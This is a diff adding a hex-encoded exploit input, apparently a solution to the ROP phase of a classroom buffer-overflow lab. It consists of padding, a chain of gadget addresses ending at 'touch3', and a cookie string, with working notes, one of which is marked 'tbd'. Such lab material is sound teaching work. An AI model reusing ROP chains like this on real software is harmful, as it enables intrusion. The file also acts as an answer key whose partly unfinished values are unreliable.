@@ -1,0 +1,25 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+02 19 40 00 00 00 00 00  /* gadget - mov rsp, rax */
+9a 18 40 00 00 00 00 00  /* gadget - mov rax, rdi */
+81 18 40 00 00 00 00 00  /* gadget - pop rax      */
+50 00 00 00 00 00 00 00  /* offset value (tbd)    */
+5a 19 40 00 00 00 00 00  /* mov eax, edx */
+7c 19 40 00 00 00 00 00  /* gadget - mov edx, ecx */
+c7 18 40 00 00 00 00 00  /* gadget - mov ecx, esi */
+b9 18 40 00 00 00 00 00  /* function - lea(%rdi,%rsi,1),%rax */
+9a 18 40 00 00 00 00 00  /* gadget - mov rax, rdi */
+f2 17 40 00 00 00 00 00  /* touch3 */
+00 00 00 00 00 00 00 00
+35 62 33 36 61 35 38 65  /* string stored in memory at a random location */
+00 00 00 00 00 00 00 00 
+
+
+/* touch3 addr 4017f2 */
+/* 0x5b36a58e         */
+/* offset 48 - a58e   */
+/* offset 50 - ?5b36a58e */
